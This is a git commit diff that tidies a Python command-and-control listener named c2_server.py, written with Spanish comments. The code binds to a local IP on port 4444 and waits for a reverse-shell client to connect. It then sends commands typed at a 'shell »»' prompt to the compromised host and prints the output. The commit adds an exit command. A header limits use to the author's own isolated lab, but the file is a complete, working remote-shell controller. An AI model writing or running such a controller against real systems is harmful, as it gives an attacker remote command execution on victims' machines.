39ec286293f98524fc2833174ad61e4bbffca4dc
chon-94 <107455342+chon-94@users.noreply.github.com>
2026-05-07 03:32:59 -0500

    arejlado

--- tunelTCP/c2_server.py
+++ tunelTCP/c2_server.py
@@ -5,36 +5,31 @@
 # ADVERTENCIA: Solo usar en laboratorio aislado propio
 # =============================================================================
 
-import socket # │ IMPORTACIÓN DE LIBRERÍAS
+#!/usr/bin/env python3
+import socket
 
 class Listener:
-
     def __init__(self, ip, port):
-       
-        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  
-        listener.bind((ip, port))  
-        listener.listen(0) 
-
-        print("[+] Esperando Conexiones") 
-
-        self.connection, address = listener.accept() 
-
-        print("[+] Tenemos una conexion de " + str(address)) 
- 
-    def ejecutarRemoto(self,command): 
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Esperando Conexiones")
+        self.connection, address = listener.accept()
+        print("[+] Tenemos una conexion de " + str(address))
+    
+    def ejecutarRemoto(self, command):
         self.connection.send(command.encode('utf-8'))
-
         return self.connection.recv(1024)
+    
+    def run(self):
+        while True:
+            command = input("shell »» ")
+            if command == "salir":
+                self.connection.close()
+                exit()
+            result = self.ejecutarRemoto(command)
+            print(result.decode('utf-8', errors='ignore'))
 
-    def run(self): 
-
-        while True: 
-            command = input("shell »» " ) 
-
-            result = self.ejecutarRemoto(command) 
- 
-            print(result.decode('utf-8', errors='ignore')) 
-
-escuchar=Listener("192.168.1.33",4444)
+escuchar = Listener("192.168.1.33", 4444)
 escuchar.run()
